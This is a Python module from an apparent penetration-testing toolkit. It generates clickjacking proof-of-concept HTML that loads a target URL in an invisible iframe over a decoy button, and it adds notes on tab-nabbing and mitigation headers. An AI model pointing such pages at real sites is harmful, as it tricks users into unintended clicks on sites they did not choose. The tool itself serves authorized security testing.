"""Clickjacking Maker - Creates clickjacking proof of concept"""
import json
from typing import Dict, Any, List
from datetime import datetime
from pathlib import Path

from aleo_pantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from aleo_pantest.core.logger import logger


class ClickjackingMaker(BaseTool):
    """Clickjacking PoC Maker - Creates clickjacking proof of concept for testing"""
    
    def __init__(self):
        metadata = ToolMetadata(
            name="Clickjacking PoC Maker",
            category=ToolCategory.WEB,
            version="2.0.0",
            author="AleoPantest Team",
            description="Generates clickjacking proof of concept HTML for authorized security testing",
            usage="aleopantest run clickjacking-make --url https://example.com --output poc.html",
            requirements=['python'],
            tags=['clickjacking', 'poc', 'web', 'testing']
        )
        super().__init__(metadata)
        self.output_dir = Path('output/clickjacking')
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def validate_input(self, url: str = None, **kwargs) -> bool:
        """Validate input"""
        if not url:
            self.add_error("URL is required")
            return False
        
        if not url.startswith(('http://', 'https://')):
            self.add_error("URL must start with http:// or https://")
            return False
        
        return True
    
    def create_basic_poc(self, url: str) -> str:
        """Create basic clickjacking PoC"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - EDUCATIONAL USE ONLY</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .warning {{
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
        }}
        .clickjacking-demo {{
            position: relative;
            width: 400px;
            height: 100px;
            border: 2px dashed #dc3545;
            margin: 20px 0;
            background: rgba(220, 53, 69, 0.1);
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            filter: alpha(opacity=0);
            z-index: 100;
        }}
        .overlay {{
            position: relative;
            z-index: 50;
            padding: 20px;
            text-align: center;
        }}
        button {{
            background-color: #28a745;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }}
        button:hover {{
            background-color: #218838;
        }}
        code {{
            background-color: #f8f9fa;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Clickjacking Proof of Concept</h1>
        
        <div class="warning">
            <strong>⚠️ EDUCATIONAL USE ONLY</strong><br>
            This PoC demonstrates clickjacking vulnerability for authorized testing purposes only.
            Unauthorized access to computer systems is illegal.
        </div>
        
        <h2>How This Works</h2>
        <p>
            This page embeds an <code>iframe</code> containing the target site with 0% opacity
            on top of a button. When you click the button, you are actually clicking on the 
            hidden iframe content (e.g., clicking a link on the target site).
        </p>
        
        <div class="clickjacking-demo">
            <iframe src="{url}" title="Target Site"></iframe>
            <div class="overlay">
                <button onclick="alert('You clicked the button!\\nBut the iframe above received the click.')">
                    Click me!
                </button>
            </div>
        </div>
        
        <h2>What Happened?</h2>
        <p>
            If the above button worked, the target site embedded in the iframe received your click
            instead of the button. This is the essence of clickjacking - deceiving users into 
            clicking unintended elements.
        </p>
        
        <h2>Protection</h2>
        <p>Sites can protect against this by:</p>
        <ul>
            <li>Setting <code>X-Frame-Options: DENY</code> header (prevents framing)</li>
            <li>Using <code>Content-Security-Policy: frame-ancestors 'none';</code></li>
            <li>Using JavaScript to detect and break out of frames</li>
        </ul>
        
        <h2>Why This Matters</h2>
        <ul>
            <li>Attackers can trick you into unintended actions</li>
            <li>Could be used to perform unauthorized transactions</li>
            <li>Can steal data or compromise accounts</li>
            <li>Often combined with social engineering</li>
        </ul>
    </div>
</body>
</html>"""
        return html
    
    def create_advanced_poc(self, url: str) -> str:
        """Create advanced clickjacking PoC with multiple techniques"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Advanced Clickjacking PoC</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 600px;
            width: 100%;
            padding: 40px;
        }}
        h1 {{
            color: #333;
            margin-bottom: 20px;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }}
        .warning {{
            background: linear-gradient(135deg, #fff5e6 0%, #ffe6cc 100%);
            border-left: 4px solid #ff9800;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
            color: #e65100;
        }}
        .technique {{
            margin: 30px 0;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #fafafa;
        }}
        .technique h3 {{
            color: #667eea;
            margin-bottom: 10px;
        }}
        .iframe-container {{
            position: relative;
            width: 100%;
            height: 150px;
            border: 2px dashed #ff6b6b;
            border-radius: 4px;
            margin: 15px 0;
            overflow: hidden;
        }}
        .iframe-container iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0;
            filter: alpha(opacity=0);
        }}
        .button-overlay {{
            position: relative;
            z-index: 100;
            padding: 30px;
            text-align: center;
            background: rgba(102, 126, 234, 0.1);
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: transform 0.2s;
        }}
        button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }}
        button:active {{
            transform: translateY(0);
        }}
        .info {{
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 12px;
            margin: 10px 0;
            border-radius: 4px;
            font-size: 14px;
            color: #0d47a1;
        }}
        code {{
            background: #263238;
            color: #aed581;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 Advanced Clickjacking Techniques</h1>
        
        <div class="warning">
            <strong>⚠️ WARNING: EDUCATIONAL PURPOSES ONLY</strong><br>
            This demonstration is for authorized security testing. Unauthorized use is illegal.
        </div>
        
        <div class="technique">
            <h3>1️⃣ Opacity-Based Clickjacking</h3>
            <p>The iframe is completely hidden (opacity: 0) behind a button.</p>
            <div class="iframe-container">
                <iframe src="{url}"></iframe>
                <div class="button-overlay">
                    <button onclick="log('Opacity-based attack detected')">Click Me!</button>
                </div>
            </div>
            <div class="info">If clicking worked, your click was redirected to the iframe.</div>
        </div>
        
        <div class="technique">
            <h3>2️⃣ Cursor-Hijacking</h3>
            <p>CSS cursor tricks can disguise clickable areas.</p>
            <div style="
                width: 100%;
                padding: 20px;
                background: #fff9c4;
                border-radius: 4px;
                cursor: help;
                text-align: center;
                user-select: none;
            ">
                Hover over me - notice the unusual cursor behavior
            </div>
            <div class="info">Attackers can use CSS to hide the actual click target with cursor manipulation.</div>
        </div>
        
        <div class="technique">
            <h3>3️⃣ Tab-Nabbing Attack</h3>
            <div class="info">
                Using <code>window.opener</code>, a popup can change the location of the opener tab
                to a phishing site while user is in the popup.
            </div>
            <button onclick="demonstrateTabNabbing()">
                Open Popup (see console for simulation)
            </button>
        </div>
        
        <h2 style="margin-top: 40px; color: #333;">Mitigation Strategies</h2>
        <ul style="line-height: 1.8; color: #555;">
            <li>✓ Set <code>X-Frame-Options: DENY</code> header</li>
            <li>✓ Use Content-Security-Policy: <code>frame-ancestors 'none';</code></li>
            <li>✓ Implement frame-busting JavaScript</li>
            <li>✓ Validate user intent with re-authentication for sensitive actions</li>
            <li>✓ Use SameSite cookies for CSRF protection</li>
            <li>✓ Implement proper CORS headers</li>
        </ul>
    </div>
    
    <script>
        function log(message) {{
            console.log('[PoC Alert]', message);
            alert(message + '\\n\\nCheck the browser console for more details.');
        }}
        
        function demonstrateTabNabbing() {{
            alert('Tab-nabbing: A popup could redirect the original page to a phishing site.\\nSee console for simulation details.');
            console.log('[Tab-Nabbing Attack Simulation]', 'In a real attack, after 5 seconds, the original page would be redirected to a phishing site.');
            console.log('[Mitigation]', 'Use rel="noopener noreferrer" on links to prevent this attack.');
        }}
        
        // Frame-busting technique example
        if (self !== top) {{
            console.warn('This page is being framed! (Frame-busting would occur here)');
        }}
    </script>
</body>
</html>"""
        return html
    
    def run(self, url: str = None, type: str = 'basic', output: str = None, **kwargs) -> Dict[str, Any]:
        """Run clickjacking PoC generator"""
        if not self.validate_input(url, **kwargs):
            return None
        
        self.clear_results()
        logger.info(f"Generating clickjacking PoC for {url}")
        
        try:
            # Generate PoC
            if type.lower() == 'advanced':
                poc_html = self.create_advanced_poc(url)
                poc_type = 'advanced'
            else:
                poc_html = self.create_basic_poc(url)
                poc_type = 'basic'
            
            # Save to file
            if not output:
                output = f'clickjacking_{poc_type}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html'
            
            output_path = self.output_dir / output
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(poc_html)
            
            result = {
                'tool': 'Clickjacking PoC Maker',
                'timestamp': datetime.now().isoformat(),
                'target_url': url,
                'poc_type': poc_type,
                'output_file': str(output_path),
                'file_size': len(poc_html),
                'html_preview': poc_html[:500] + '...',
                'instructions': [
                    "1. Open the generated HTML file in a browser",
                    "2. Try clicking the 'Click Me!' button",
                    "3. If the target is vulnerable (no X-Frame-Options), the click will be hijacked",
                    "4. Check browser console for detailed logs",
                    "5. Review recommendations if vulnerability is confirmed"
                ],
                'disclaimer': 'EDUCATIONAL USE ONLY - Do not use for unauthorized testing',
                'legal_notice': 'Unauthorized access to computer systems is illegal under CFAA and similar laws'
            }
            
            self.add_result(result)
            logger.info(f"PoC saved to {output_path}")
            return result
            
        except Exception as e:
            logger.exception("PoC generation failed")
            self.add_error(f"Generation failed: {e}")
            return None
